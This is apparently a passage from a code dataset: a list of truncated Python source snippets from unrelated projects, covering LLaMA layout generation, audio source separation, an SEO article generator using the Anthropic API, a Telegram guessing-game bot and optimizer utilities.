llama varies 2 different output formats without tuning here\n    pred_elements = []\n    try:\n        pred_elements = seq_to_element(ele_answer)\n    except:\n        pred_elements = seq_to_element_v2(ele_answer)\n\n    # ------- boxes ----------------\n    llama.load_state_dict(lora_weight_box, strict=False)\n\n    # prompt\n    elements_str = ','.join(pred_elements)\n    box_prompt = build_llama_prompt(\n        message=box_template['prompt_template'].format(prompt, elements_str),\n        system_prompt=box_template['system_prompt_template'],\n    )\n    \n    # answer\n    box_answer = chat(llama, llama_tokenizer, box_prompt, device)\n    for line in box_answer.split('\\n'):\n        if '(' in line and ')' in line:\n            box_answer = line\n            break\n    pred_boxes = seq_to_box(box_answer)\n\n    # mapping to current resolution\n    pred_boxes = [\n        (box[0], [int(box[1][0] / 768 * W), int(box[1][1] / 768 * H), int(box[1][2] / 768 * W), int(box[1][3] / 768 * H)])\n        for box in pred_boxes\n    ]\n    box_answer = box_to_seq(pred_boxes)\n    vis_layout = draw_box(pred_boxes, H=H, W=W)\n\n    global layouts\n    layouts = []\n    for box in pred_boxes:\n        layouts.append({\n            'label': box[0].lower(),\n            'box': box[1],\n        })\n    \n    layouts.append({\n        'label': postfix,\n        'box': [W // 2, H // 2, W, H]\n    })\n\n    vis_layout = (vis_layout.permute(0, 2, 3, 1) * 127.5 + 127.5).cpu().numpy().clip(0, 255).astype(np.uint8)\n    return box_answer, vis_layout\n\n\ndef stage2_process(box_answer, prompt, postfix, seed, n_prompt, guide_scale, steps, control_max_t, control_min_t, panel_control_scale, with_memory, num_samples=1):\n\n    global layouts, edit_mask, intermediates\n    seed_everything(seed)\n\n    # conditions\n    prompt = prompt + ', ' + postfix\n    shape = (4, H // 8, W // 8)\n\n    # panel\n    pred_boxes = seq_to_box(box_answer)\n    layouts = []\n    for box in pred_boxes:\n        layouts.append({\n            'label': box[0].lower(),\n            'box': box[1],\n        })\n    \n    layouts.append({\n        'label': postfix,\n        'box': [W // 2, H // 2, W, H]\n    })\n\n    # pack control\n    ins_masks, ins_texts = [], []\n    for layout in la",
    "##############################################################################\n#\n#  Pytests for the overall package interface\n#\n#  This file is part of XAD's Python bindings, a comprehensive library for\n#  automatic differentiation.\n#\n#  Copyright (C) 2010-2024 Xcelerit Computing Ltd.\n#\n#  This program is free software: you can redistribute it and/or modify\n#  it under the terms of the GNU Affero General Public License as published\n#  by the Free Software Foundation, either version 3 of the License, or\n#  (at your option) any later version.\n#\n#  This program is distributed in the hope that it will be useful,\n#  but WITHOUT ANY WARRANTY; without even the implied warranty of\n#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#  GNU Affero General Public License for more details.\n#\n#  You should have received a copy of the GNU Affero General Public License\n#  along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nimport xad\n\ndef test_version_info():\n    assert isinstance(xad.__version__, str)\n",
    "# Copyright (c) 2024, Zhendong Peng (pzd17@tsinghua.org.cn)\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nfrom functools import partial\nimport multiprocessing as mp\nfrom pathlib import Path\nfrom typing import Optional, Union\n\nimport click\nfrom demucs import apply, audio, pretrained, separate\nfrom loguru import logger\nimport torch\nfrom tqdm import tqdm\n\nfrom utils.file import AUDIO, list_files, make_dirs\n\n\ndef init_model(\n    name: str = \"htdemucs\",\n    device: Optional[Union[str, torch.device]] = None,\n    segment: Optional[int] = None,\n) -> torch.nn.Module:\n    \"\"\"\n    Initialize the model\n    Args:\n        name: Name of the model\n        device: Device to use\n        segment: Set split size of each chunk. This can help save memory of graphic card.\n    Returns:\n        The model\n    \"\"\"\n\n    model = pretrained.get_model(name)\n    model.eval()\n\n    if device:\n        model.to(device)\n    logger.info(f\"Model {name} loaded on {device}\")\n\n    if segment:\n        if isinstance(model, apply.BagOfModels):\n            for m in model.models:\n                m.segment = segment\n        else:\n            model.segment = segment\n    return model\n\n\ndef separate_audio(\n    model: torch.nn.Module,\n    audio_path: Union[Path, str],\n    shifts: int = 1,\n    num_workers: int = 0,\n    progress: bool = False,\n) -> dict[str, torch.Tensor]:\n    \"\"\"\n    Separate audio into sources\n    Args:\n        model: The model\n        audio_path: The audio path\n        shifts: Run the model N times, larger values will increase the quality but also the time\n        num_workers: if non zero, device is 'cpu', how many threads to use in parallel\n        progress: Show progress bar\n    Returns:\n        The separated tracks\n    \"\"\"\n\n    audio = separate.load_track(audio_path, model.audio_channels, model.samplerate)\n    ref = audio.mean(0)\n    audio = (audio - ref.mean()) / audio.std()\n\n    sources = apply.apply_model(\n        model,\n        audio[None],\n        device=next(model.parameters()).device,\n        shifts=shifts,\n        split=True,\n        overlap=0.25,\n        progress=progress,\n        num_workers=num_workers,\n    )[0]\n    sources = sources * ref.std() + ref.mean()\n    return dict(zip(model.sources, sources))\n\n\ndef merge_tracks(\n    tracks: dict[str, torch.Tensor],\n    filter: Optional[list[str]] = None,\n) -> torch.Tensor:\n    \"\"\"\n    Merge tracks into one audio\n    Args:\n        tracks: The separated audio tracks\n        filter: The tracks to merge\n    Returns:\n        The merged audio\n    \"\"\"\n\n    filter = filter or list(tracks.keys())\n    merged = torch.zeros_like(next(iter(tracks.values())))\n    for key in tracks:\n        if key in filter:\n            merged += tracks[key]\n    return merged\n\n\ndef worker(\n    input_dir: str,\n    output_dir: str,\n    num_channels: int,\n    recursive: bool,\n    overwrite: bool,\n    track: list[str],\n    model: str,\n    shifts: int,\n    device: torch.device,\n    shard_idx: int = -1,\n    total_shards: int = 1,\n    num_workers: int = 0,\n):\n    files = list_files(input_dir, extensions=AUDIO, recursive=recursive)\n    if shard_idx >= 0:\n        files = [f for i, f in enumerate(files) if i % total_shards == shard_idx]\n    shard_name = f\"[Shard {shard_idx + 1}/{total_shards}]\"\n    logger.info(f\"{shard_name} Found {len(files)} files.\")\n    if len(files) == 0:\n        return\n\n    # TODO: init model outside\n    model = init_model(model, device)\n    skipped = 0\n    for file in tqdm(\n        files,\n        desc=f\"{shard_name} Separating audio\",\n        position=0 if shard_idx < 0 else shard_idx,\n        leave=False,\n    ):\n        fout = output_dir / file.relative_to(input_dir)\n        if not fout.parent.exists():\n            fout.parent.mkdir(parents=True)\n        if fout.exists() and not overwrite:\n            skipped += 1\n            continue\n\n        if device.type == \"cuda\":\n            num_workers = 0\n        separated = separate_audio(model, file, shifts=shifts, num_workers=num_workers)\n        merged = merge_tracks(separated, track)[2 - num_channels :]\n        audio.save_audio(merged, fout, model.samplerate)\n\n    logger.info(\"Done!\")\n    logger.info(f\"Total: {len(files)}, Skipped: {skipped}\")\n    logger.info(f\"Output directory: {output_dir}\")\n\n\n@click.command()\n@click.argument(\"input_dir\", type=click.Path(exists=True, file_okay=False))\n@click.argument(\"output_dir\", type=click.Path(file_okay=False))\n@click.option(\"--num-channels\", default=1, help=\"Num channels of output files\")\n@click.option(\"--recursive/--no-recu",
    "import os\nfrom dotenv import load_dotenv\nimport anthropic\n\n# Load variables from .env file\nload_dotenv()\n\n# Get variables from environment\nbrand_name = os.getenv(\"BRAND_NAME\")\nkeywords_file_path = os.getenv(\"KEYWORDS_FILE_PATH\")\nsample_article_file_path = os.getenv(\"SAMPLE_ARTICLE_FILE_PATH\")\ncustom_collections_file_path = os.getenv(\"CUSTOM_COLLECTIONS_FILE_PATH\")\npages_file_path = os.getenv(\"PAGES_FILE_PATH\")\nproducts_file_path = os.getenv(\"PRODUCTS_FILE_PATH\")\nblogs_file_path = os.getenv(\"BLOGS_FILE_PATH\")\nanthropic_api_key = os.getenv(\"ANTHROPIC_API_KEY\")\n\n# Read the contents of the files\nwith open(keywords_file_path, \"r\", encoding=\"utf-8\") as file:\n    keywords = file.read().splitlines()\n\nwith open(sample_article_file_path, \"r\", encoding=\"utf-8\") as file:\n    sample_article = file.read()\n\nwith open(custom_collections_file_path, \"r\", encoding=\"utf-8\") as file:\n    custom_collections = file.read()\n\nwith open(pages_file_path, \"r\", encoding=\"utf-8\") as file:\n    pages = file.read()\n\nwith open(products_file_path, \"r\", encoding=\"utf-8\") as file:\n    products = file.read()\n\nwith open(blogs_file_path, \"r\", encoding=\"utf-8\") as file:\n    blogs = file.read()\n\ndef generate_article(system_prompt, user_prompt, api_key):\n    client = anthropic.Client(api_key=api_key)\n    response = client.messages.create(\n        model=\"claude-3-opus-20240229\",\n        max_tokens=4000,\n        system=system_prompt,\n        messages=[\n            {\"role\": \"user\", \"content\": user_prompt}\n        ]\n    )\n    print(\"API Response:\")\n    print(response)\n    return \"\".join(content.text for content in response.content)\n\n# Iterate over each keyword and generate an article\nfor i, keyword in enumerate(keywords, start=1):\n    # Prepare the system prompt\n    system_prompt = f\"\"\"\n    It must be at least 4 pages of content. Do not invent any links. You can write an article, just write generally and don't make any claims. Write a fully formatted article with tables, embeds, and much more. Write in as much detial as possible without repeating the same thing over and over. You are writing for {brand_name}. When writing for them, I want you to ensure to use this html embed with the collection ID of relevant collections to the article.\n\n    <div class=\"hura-collection-embedder\" data-id=\"296336228548\" data-view=\"gridview\" data-limit=\"6\" data-price=\"1\" data-label=\"1\" data-hover=\"1\" data-border=\"1\" data-sh=\"1\" data-coldk=\"4\" data-coltl=\"1\" data-colmb=\"1\" ></div>\n\n    You can change the data limit to 12 if you're doing less collections for an article.\n\n    I have included other important pages underneath the collections. Throughout the article you're writing, please use relative internal links using the handle from this list:\n\n    When writing the articles, \"{brand_name} CANNOT make a structured function claim\" - We cannot talk about any of the pharmalogical profiles that would cause \"Both can improve your well-being and comfort.\" - We cannot make medical claims such as \"helps with sleep\". Make sure to follow FDA's laws and remove any structured function claims or specific medical benefit claims.\n\n    Custom Collections:\n    {custom_collections}\n\n    Pages:\n    {pages}\n\n    Products:\n    {products}\n\n    Blogs:\n    {blogs}\n\n    Sample Article:\n    {sample_article}\n    \"\"\"\n\n    # Prepare the user prompt\n    user_prompt = f\"\"\"\n    Write a 1500 word article. Write 20 titles and 2 paragraphs per title, with formatting like tables, embeds, internal links and lists. Do not use any placeholder information. Make the content about the company - do not invent links, use at least 3 embeds and 4 collection internal links per article. Please generate an article about the keyword \"{keyword}\" based on the following information: Please be creative when writing. Focus on writing good e-magazine style selling content but from the perspective of the business. I have these products - I'm writing for {brand_name}. These are all products they sell, and collections of products they sell. I want you, by embedding images, to make a rankable SEO-Optimized listicle article about the keyword. You should use a lot of tables and other formatting. Do not use complicated language, you're writing for working class workers. Please use Sentence case. This is vital. Don't use crazy language, but give a lot of interesting formatting and make it like a journal style advertising the specific products. In the article, please embed some of these collections. I have included the collections in the prompt as well. Please use headers such as # h1 on the top header and then ## h2 and h3 ### throughout the article and be considerate about where you place both the collection embeds and the collection links, and that you use appropriate SEO-Optimized anchor text for internal links. Don't be repetitive. When writing the articles - GPT needs to filter/say \"{brand_name} CANNOT make a structured function claim\" - We cannot talk about any of the pharmalogical profiles than would cause \"Both can improve your we",
    "import os\nimport filecmp\nimport shutil\nfrom .face_swap import MultisubjectFaceSwapNode\nfrom .regional_prompting import RegionalPromptingNode, RegionalAttentionProcessorNode, GetRegionalMaskNode\n\nimport __main__\n\n\n# Update to javascripts files\njavascript_folder = os.path.join(os.path.dirname(os.path.realpath(__file__)), \"javascript\")\nextentions_folder = os.path.join(os.path.dirname(os.path.realpath(__main__.__file__)), \"web\" + os.sep + \"extensions\" + os.sep + \"SALT\" + os.sep)\nif not os.path.exists(extentions_folder):\n    os.mkdir(extentions_folder)\n\nresult = filecmp.dircmp(javascript_folder, extentions_folder)\nif result.left_only or result.diff_files:\n    file_list = list(result.left_only)\n    file_list.extend(x for x in result.diff_files if x not in file_list)\n\n    for file in file_list:\n        src_file = os.path.join(javascript_folder, file)\n        dst_file = os.path.join(extentions_folder, file)\n        if os.path.exists(dst_file):\n            os.remove(dst_file)\n        shutil.copy(src_file, dst_file)\n\n\nNODE_DISPLAY_NAME_MAPPINGS = {\n    \"MultisubjectFaceSwapNode\": \"Multisubject Face Swap\",\n    \"RegionalPromptingNode\": \"Regional Prompting\",\n    \"RegionalAttentionProcessorNode\": \"Regional Attention Processor\",\n    \"GetRegionalMaskNode\": \"Get Regional Mask Node\",\n}\n\nNODE_CLASS_MAPPINGS = {\n    \"MultisubjectFaceSwapNode\": MultisubjectFaceSwapNode,\n    \"RegionalPromptingNode\": RegionalPromptingNode,\n    \"RegionalAttentionProcessorNode\": RegionalAttentionProcessorNode,\n    \"GetRegionalMaskNode\": GetRegionalMaskNode,\n}\n",
    "# Copyright (c) Facebook, Inc. and its affiliates.\n# All rights reserved.\n#\n# This source code is licensed under the license found in the\n# LICENSE file in the root directory of this source tree.\n\nimport os\nimport errno\nimport torch\nimport sys\nimport logging\nimport json\nfrom pathlib import Path\nimport torch.distributed as dist\nimport csv\nfrom tqdm import tqdm\n\nlogger = logging.getLogger(__name__)\n\ndef init_logger(is_main=True, is_distributed=False, filename=None):\n    if is_distributed:\n        torch.distributed.barrier()\n    handlers = [logging.StreamHandler(sys.stdout)]\n    if filename is not None:\n        handlers.append(logging.FileHandler(filename=filename))\n    logging.basicConfig(\n        datefmt=\"%m/%d/%Y %H:%M:%S\",\n        level=logging.INFO if is_main else logging.WARN,\n        format=\"[%(asctime)s] {%(filename)s:%(lineno)d} %(levelname)s - %(message)s\",\n        handlers=handlers,\n    )\n    logging.getLogger('transformers.tokenization_utils').setLevel(logging.ERROR)\n    logging.getLogger('transformers.tokenization_utils_base').setLevel(logging.ERROR)\n    return logger\n\ndef get_checkpoint_path(opt):\n    checkpoint_path = Path(opt.checkpoint_dir) / opt.name\n    checkpoint_exists = checkpoint_path.exists()\n    if opt.is_distributed:\n        torch.distributed.barrier()\n    checkpoint_path.mkdir(parents=True, exist_ok=True)\n    return checkpoint_path, checkpoint_exists\n\ndef symlink_force(target, link_name):\n    try:\n        os.symlink(target, link_name)\n    except OSError as e:\n        if e.errno == errno.EEXIST:\n            os.remove(link_name)\n            os.symlink(target, link_name)\n        else:\n            raise e\n\ndef save(model, optimizer, scheduler, step, best_eval_metric, opt, dir_path, name):\n    model_to_save = model.module if hasattr(model, \"module\") else model\n    path = os.path.join(dir_path, \"checkpoint\")\n    epoch_path = os.path.join(path, name) #\"step-%s\" % step)\n    os.makedirs(epoch_path, exist_ok=True)\n    model_to_save.save_pretrained(epoch_path)\n    cp = os.path.join(path, \"latest\")\n    fp = os.path.join(epoch_path, \"optimizer.pth.tar\")\n    checkpoint = {\n        \"step\": step,\n        \"optimizer\": optimizer.state_dict(),\n        \"scheduler\": scheduler.state_dict(),\n        \"opt\": opt,\n        \"best_eval_metric\": best_eval_metric,\n    }\n    torch.save(checkpoint, fp)\n    symlink_force(epoch_path, cp)\n\n\ndef load(model_class, dir_path, opt, reset_params=False):\n    epoch_path = os.path.realpath(dir_path)\n    optimizer_path = os.path.join(epoch_path, \"optimizer.pth.tar\")\n    logger.info(\"Loading %s\" % epoch_path)\n    model = model_class.from_pretrained(epoch_path)\n    model = model.to(opt.device)\n    logger.info(\"loading checkpoint %s\" %optimizer_path)\n    checkpoint = torch.load(optimizer_path, map_location=opt.device)\n    opt_checkpoint = checkpoint[\"opt\"]\n    step = checkpoint[\"step\"]\n    if \"best_eval_metric\" in checkpoint:\n        best_eval_metric = checkpoint[\"best_eval_metric\"]\n    else:\n        best_eval_metric = checkpoint[\"best_dev_em\"]\n    if not reset_params:\n        optimizer, scheduler = set_optim(opt_checkpoint, model)\n        scheduler.load_state_dict(checkpoint[\"scheduler\"])\n        optimizer.load_state_dict(checkpoint[\"optimizer\"])\n    else:\n        optimizer, scheduler = set_optim(opt, model)\n\n    return model, optimizer, scheduler, opt_checkpoint, step, best_eval_metric\n\nclass WarmupLinearScheduler(torch.optim.lr_scheduler.LambdaLR):\n    def __init__(self, optimizer, warmup_steps, scheduler_steps, min_ratio, fixed_lr, last_epoch=-1):\n        self.warmup_steps = warmup_steps\n        self.scheduler_steps = scheduler_steps\n        self.min_ratio = min_ratio\n        self.fixed_lr = fixed_lr\n        super(WarmupLinearScheduler, self).__init__(\n            optimizer, self.lr_lambda, last_epoch=last_epoch\n        )\n\n    def lr_lambda(self, step):\n        if step < self.warmup_steps:\n            return (1 - self.min_ratio)*step/float(max(1, self.warmup_steps)) + self.min_ratio\n\n        if self.fixed_lr:\n            return 1.0\n\n        return max(0.0,\n            1.0 + (self.min_ratio - 1) * (step - self.warmup_steps)/float(max(1.0, self.scheduler_steps - self.warmup_steps)),\n        )\n\n\nclass FixedScheduler(torch.optim.lr_scheduler.LambdaLR):\n    def __init__(self, optimizer, last_epoch=-1):\n        super(FixedScheduler, self).__init__(optimizer, self.lr_lambda, last_epoch=last_epoch)\n    def lr_lambda(self, step):\n        return 1.0\n\n\ndef set_dropout(model, dropout_rate):\n    for mod in model.modules():\n        if isinstance(mod, torch.nn.Dropout):\n            mod.p = dropout_rate\n\n\ndef set_optim(opt, model):\n    if opt.optim == 'adam':\n        optimizer = torch.optim.Adam(model.parameters(), lr=opt.lr)\n    elif opt.optim == 'adamw':\n        optimizer = torch.optim.AdamW(model.parameters(), lr=opt.lr, weight_decay=opt.weight_decay)\n    if opt.scheduler == 'fixed':\n        scheduler = FixedScheduler(optimizer)\n    elif opt.scheduler == 'linear':\n        if opt.scheduler_s",
    "#!env python\n#\n#  Purpose: Collect all the actions that preceed a code spelunking\n#  session into a single script file.  Note, this script MUST be\n#  executed from the root of where you wish to work.  This script can\n#  take many minutes if executed over a large code base, for example\n#  starting it in FreeBSD's /usr/src directory.\n\n# Use option parsing.  Right now we have one option, which is whether\n# or not we're looking at a kernel code base.  This is important to\n# cscope because it will normally use /usr/include unless the -k\n# (kernel) option is used.\n\n# Redefine these to find the correct programs\n\ncscope=\"/opt/homebrew/bin/cscope\"\ngtags=\"/opt/homebrew/bin/gtags\"\nhtags=\"/opt/homebrew/bin/htags\"\ndoxygen=\"/opt/homebrew/bin/doxygen\"\n\nimport sys\nimport os\n\ndef main():\n\n    from optparse import OptionParser\n    \n    parser = OptionParser()\n    parser.add_option(\"-k\", \"--kernel\",\n                      action=\"store_true\", dest=\"kernel\", default=False,\n                      help=\"kernel code, do not use /usr/include with cscope\")\n    parser.add_option(\"-d\", \"--doxygen\",\n                      action=\"store_true\", dest=\"doxygen\", default=False,\n                      help=\"build doxygen output\")\n    parser.add_option(\"-c\", \"--cscope\",\n                      action=\"store_true\", dest=\"cscope\", default=False,\n                      help=\"generate cscope database\")\n    parser.add_option(\"-w\", \"--web\",\n                      action=\"store_true\", dest=\"web\", default=False,\n                      help=\"build web pages as well\")\n    parser.add_option(\"-t\", \"--title\",\n                      dest=\"title\", default=None,\n                      help=\"title to give to web pages\")\n    \n    (options, args) = parser.parse_args()\n    \n    # Execute Doxygen, cscope and then gtags/htags.\n    # We use this ordering because if you select Doxygen but have no\n    # Doxyfile then we want to bail early and force you to update the\n    # Doxyfile before re-executing.\n\n    if (options.doxygen == True):\n        if (not os.path.exists(\"Doxyfile\")):\n            exit_status = os.spawnlp(os.P_WAIT, doxygen, 'doxygen', '-g')\n            print(\"doxygen option selected but no DoxyFile\")\n            if (os.path.exists(\"Doxyfile\")):\n                print(\"Doxyfile created.  Please update Doxyfile and re-run either %s or run doxygen directly\" % sys.argv[0])\n            sys.exit(1)\n        else:\n            exit_status = os.spawnlp(os.P_WAIT, doxygen, 'doxygen', 'Doxyfile')\n            if (exit_status == 0):\n                print(\"doxygen complete\")\n            else:\n                print(\"doxygen failed\")\n                sys.exit(1)\n            \n    if (options.cscope == True):\n        if (options.kernel == True):\n            exit_status = os.spawnlp(os.P_WAIT, cscope, 'cscope', '-R', '-q', '-b', '-k')\n        else:\n            exit_status = os.spawnlp(os.P_WAIT, cscope, 'cscope', '-R', '-q', '-b')\n        if (exit_status == 0):\n            print(\"cscope complete\")\n        else:\n            print(\"cscope failed\")\n            sys.exit(1)\n\n    exit_status = os.spawnlp(os.P_WAIT, gtags, 'gtags')\n\n    if (exit_status == 0):\n        print(\"gtags complete\")\n    else:\n        print(\"gtags failed\")\n        sys.exit(1)\n\n    if (options.web == True):\n        if (options.title != None):\n            exit_status = os.spawnlp(os.P_WAIT, htags, 'htags', \n                                     '--line-number', '--symbol',\n                                     '--title', options.title)\n        else:\n            exit_status = os.spawnlp(os.P_WAIT, htags, 'htags',\n                                 '--line-number', '--symbol')\n        if (exit_status == 0):\n            print(\"htags complete\")\n        else:\n            print(\"htags failed\")\n            sys.exit(1)\n\n    print(\"ready to spelunk\")\n\n# Call the main function.\nmain()\n",
    "import abc\nimport copy\nimport json\nimport logging\nimport os\nimport random\nimport re\nimport sqlite3\nimport sys\nimport textwrap\nfrom collections import Counter\nfrom typing import Any, TypedDict\n\nfrom openai import AzureOpenAI, OpenAI\nfrom telebot import TeleBot\nfrom telebot.types import BotCommand, Message, User\n\nlogger = logging.getLogger(__name__)\n\nDEFAULT_CONFIG = {  # TODO: allow to change\n    \"max_guesses\": 5,\n    \"chat\": {\n        \"model\": \"gpt-35-turbo\",\n        \"temperature\": 0.5,\n    },\n    \"model\": \"dall-e\",\n}\n\nABSENT = \"\u2b1b\"\nPRESENT = \"\ud83d\udfe8\"\nCORRECT = \"\ud83d\udfe9\"\nDATA_DIR = os.getenv(\"DATA_DIR\", \"data\")\n\n\nclass GameState(TypedDict):\n    answer: str\n    remain_guesses: int\n    revealed: list[str]\n    min_unrevealed: int\n    game: \"GuessGame\"\n    context: dict[str, Any]\n\n\nclass GameManager:\n    def __init__(self) -> None:\n        self.is_debug = False\n        self._states: dict[str, GameState] = {}\n        os.makedirs(DATA_DIR, exist_ok=True)\n        self._db = os.path.join(DATA_DIR, \"game.db\")\n        self._init_db()\n\n    def set_debug(self, is_debug: bool) -> None:\n        self.is_debug = is_debug\n\n    def _init_db(self):\n        with sqlite3.connect(self._db) as conn:\n            conn.execute(\n                textwrap.dedent(\"\"\"\n                CREATE TABLE IF NOT EXISTS scores (\n                    username TEXT PRIMARY KEY,\n                    score INTEGER DEFAULT 0\n                )\n                \"\"\")\n            )\n            conn.commit()\n\n    def start_game(self, chat_id: int, state: GameState) -> GameState:\n        logger.info(\"Starting a new game in chat %d\", chat_id)\n        self._states[chat_id] = state\n        return state\n\n    def get_state(self, chat_id: int) -> GameState | None:\n        return self._states.get(chat_id)\n\n    def clear_state(self, chat_id: int) -> None:\n        self._states.pop(chat_id, None)\n\n    def record_win(self, user: User) -> None:\n        with sqlite3.connect(self._db) as conn:\n            conn.execute(\n                \"INSERT OR REPLACE INTO scores (username, score) VALUES (?, COALESCE((SELECT score FROM scores WHERE username = ?), 0) + 1)\",\n                (user.username, user.username),\n            )\n            conn.commit()\n\n    def get_scores(self) -> dict[str, int]:\n        with sqlite3.connect(self._db) as conn:\n            cur = conn.execute(\"SELECT username, score FROM scores\")\n            return dict(cur.fetchall())\n\n\ndef evaluate_guess(guess: str, answer: str) -> str:\n    result = [\"\"] * len(answer)\n    counter = Counter(answer)\n    for i, l in enumerate(answer):\n        if i >= len(guess):\n            result[i] = ABSENT\n        elif guess[i] == l:\n            result[i] = CORRECT\n            counter[l] -= 1\n    for i, l in enumerate(guess):\n        if i >= len(result) or result[i]:\n            continue\n        elif counter.get(l, 0) > 0:\n            result[i] = PRESENT\n            counter[l] -= 1\n        else:\n            result[i] = ABSENT\n    return \"\".join(result)\n\n\ngame_manager = GameManager()\nbot = TeleBot(token=os.environ[\"BOT_TOKEN\"])\nme = bot.get_me()\n\n\ndef handle_exception(f):\n    import inspect\n\n    def wrapper(*args, **kwargs):\n        parameters = inspect.signature(f).parameters\n        if \"self\" in parameters:\n            message = args[1]\n        else:\n            message = args[0]\n        try:\n            logger.debug(\n                \"New message from %s chat: %s\", message.chat.type, message.chat.id\n            )\n            return f(*args, **kwargs)\n        except Exception as e:\n            logger.exception(e)\n            bot.reply_to(message, \"\u51fa\u73b0\u4e86\u4e00\u4e9b\u95ee\u9898\uff0c\u8bf7\u67e5\u770b\u670d\u52a1\u7aef\u65e5\u5fd7\u3002\")\n\n    return wrapper\n\n\nclass GuessGame(abc.ABC):\n    def __init__(self, openai_client: OpenAI) -> None:\n        self.openai_client = openai_client\n        self.config = copy.deepcopy(DEFAULT_CONFIG)\n\n    @abc.abstractmethod\n    def add_to_bot(self, bot: TeleBot) -> None:\n        pass\n\n    @abc.abstractmethod\n    def get_my_commands(self) -> list[BotCommand]:\n        pass\n\n    @abc.abstractmethod\n    def check_answer(self, guess: str, state: GameState) -> tuple[bool, str]:\n        pass\n\n\nclass GuessIdiom(GuessGame):\n    IDIOM_DATABASE_URL = (\n        \"https://cdn.jsdelivr.net/gh/cheeaun/chengyu-wordle/data/THUOCL_chengyu.txt\"\n    )\n    IDIOM_FILE = os.path.join(DATA_DIR, \"idioms.txt\")\n\n    def __init__(self, openai_client: OpenAI) -> None:\n        super().__init__(openai_client)\n        self.idioms = self._load_idioms()\n        self.config[\"min_unrevealed\"] = 1\n\n    def check_answer(self, guess: str, state: GameState) -> tuple[bool, str]:\n        return guess == state[\"answer\"], evaluate_guess(guess, state[\"answer\"])\n\n    @handle_exception\n    def start_game(self, message: Message) -> None:\n        game_state = game_manager.get_state(message.chat.id)\n        if game_state:\n            # TODO: per chat state\n            bot.reply_to(message, \"\u5df2\u7ecf\u6709\u4e00\u4e2a\u6e38\u620f\u6b63\u5728\u8fdb\u884c\u4e2d\")\n            return\n        prepare = bot.reply_to(message, \"\u6b63\u5728\u51c6\u5907\u6e38\u620f\uff0c\u8bf7\u7a0d\u7b49...\")\n        idiom = random.choice(self.idioms)\n        ga",
    "import torch\nimport random\nfrom torch.optim import Optimizer\nfrom torch import Tensor\nfrom collections import defaultdict\nfrom typing import List, Optional, Dict\nimport time\nimport math\n\nllama_block_prefix = [['model.embed_tokens'], ['model.layers.0.'], ['model.layers.1.'], ['model.layers.2.'], ['model.layers.3.'], \n                      ['model.layers.4.'], ['model.layers.5.'], ['model.layers.6.'], ['model.layers.7.'], ['model.layers.8.'], \n                      ['model.layers.9.'], ['model.layers.10.'], ['model.layers.11.'], ['model.layers.12.'], ['model.layers.13.'], \n                      ['model.layers.14.'], ['model.layers.15.'], ['model.layers.16.'], ['model.layers.17.'], ['model.layers.18.'], \n                      ['model.layers.19.'], ['model.layers.20.'], ['model.layers.21.'], ['model.layers.22.'], ['model.layers.23.'], \n                      ['model.layers.24.'], ['model.layers.25.'], ['model.layers.26.'], ['model.layers.27.'], ['model.layers.28.'], \n                      ['model.layers.29.'], ['model.layers.30.'], ['model.layers.31.'], ['lm_head']]\n\n# Optional [0, 1, 2]. \n    # 0: no print\n    # 1: print the relative time whenever a parameter's grad is ready\n    # 2: for debug usage only. Will set all the parameters trainable, print the grad ready time for each parameter. \n    #     In this case, all the grad except the \"specified\" trainable parameters will be set to None after being calculated.\nBACKWARD_VERBOSE = 0\n\nclass BlockOptimizer(Optimizer):\n    \"\"\"Wrap the original optimizer to update trainable parameters periodically based on a specified block list.\"\"\"\n\n    def __init__(\n        self,\n        base_optimizer: Optimizer,\n        named_parameters_list,\n        block_prefix_list: List[str],\n        switch_block_every: int = 10,\n        start_block: Optional[int] = None,\n        switch_mode: str = \"descending\",\n        active_modules: List[str] = None,\n        verbose: int = 1,\n        log_fn = None,\n    ):\n        \"\"\"\n        Args:\n            base_optimizer (Optimizer): The base optimizer being wrapped by the BlockOptimizer.\n            named_parameters_list: A function that generates the named parameters of the model.\n            block_prefix_list (List[List[str]]): The list of blocks of parameters to be updated.\n\n            switch_block_every (int, optional): The number of optimization steps before switching to the next block. Defaults to 10.\n            start_block (Optional[int], optional): The index of the block to start with. Defaults to None.\n            switch_mode (str, optional): The mode for switching between different blocks of parameters. Defaults to \"descending\".\n            active_modules (List[str]): The list of modules that are always active during optimization. Defaults to None.\n            verbose (int, optional): The verbosity level for printing information during optimization. Defaults to 1.\n            log_fn: A logging function for recording information during optimization. Defaults to None.\n        \"\"\"\n        # TODO: add automaic block_prefix_list inference\n        if block_prefix_list == \"llama-7b\":\n            block_prefix_list = llama_block_prefix\n        elif block_prefix_list is None:\n            block_prefix_list = self.infer_param_groups([n for n, _ in named_parameters_list])\n\n        assert switch_mode in [\"random\", \"descending\", \"ascending\", \"fixed\"]\n        assert isinstance(block_prefix_list, list)\n\n        self.verbose = verbose\n        self.switch_mode = switch_mode\n        self.switch_block_every = switch_block_every\n        self.named_parameters_list = named_parameters_list\n        self.weight_decay = base_optimizer.param_groups[0][\"weight_decay\"]\n        self.block_prefix_list = block_prefix_list\n        self.block_num = len(block_prefix_list)\n        self.log_fn = log_fn\n        self.current_block_idx = start_block if start_block is not None else (self.block_num - 1 if switch_mode == \"descending\" else 0)\n        self.global_step = 0\n        self.base_optimizer = base_optimizer\n        self.active_modules = active_modules\n\n        self.param_groups = base_optimizer.param_groups\n        self.state_dict = base_optimizer.state_dict # for compatibility of hf Trainer\n\n        super().__init__(self.param_groups, base_optimizer.defaults)\n        \n        if BACKWARD_VERBOSE:\n            self.record_mark = True\n            self.ordered_named_params = []\n            self.param_num = len(named_parameters_list)\n            for n, p in named_parameters_list:\n                # p.register_hook(self.test_hook(n))\n                p.register_post_accumulate_grad_hook(self.test_hook(n))\n\n        self.update_trainable_params(initialize=True)\n\n        if BACKWARD_VERBOSE == 2:\n            for name, param in self.named_parameters_list:\n                param.requires_grad_(True)\n                \n    def infer_param_groups(self, param_names):\n        \"\"\"automatic inference of the parameter groups based on the parameter names.\n        divide groups into:\n            * e",
